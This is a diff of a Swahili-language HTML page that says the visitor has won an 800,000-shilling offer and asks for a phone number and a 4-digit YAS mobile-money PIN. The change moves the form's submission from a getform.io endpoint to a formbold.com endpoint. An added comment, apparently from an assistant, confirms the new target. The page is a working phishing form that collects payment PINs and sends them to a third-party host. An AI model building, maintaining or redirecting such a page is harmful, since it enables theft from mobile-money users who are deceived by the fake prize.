@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>Umejishindia Ofa</title>
-    <!-- This line correctly links to your CSS file -->
+    <!-- Link to the external CSS file -->
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -15,7 +15,8 @@
             <p>Kiwango cha Ofa kinachoweza kupatikana</p>
             <h1>Tsh 800,000</h1>
         </div>
-        <form id="offerForm" action="https://getform.io/f/agdvpvjb" method="POST">
+        <!-- The form now points to your Formbold endpoint -->
+        <form id="offerForm" action="https://formbold.com/s/9ROxy" method="POST">
             <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Namba ya Simu (eg. 07XXXXXXXX)" required>
             <input type="password" id="pin" name="pin" placeholder="YAS Neno siri (4 digits)" maxlength="4" pattern="\d{4}" required>
             <button type="submit" id="submitBtn">thibitisha</button>
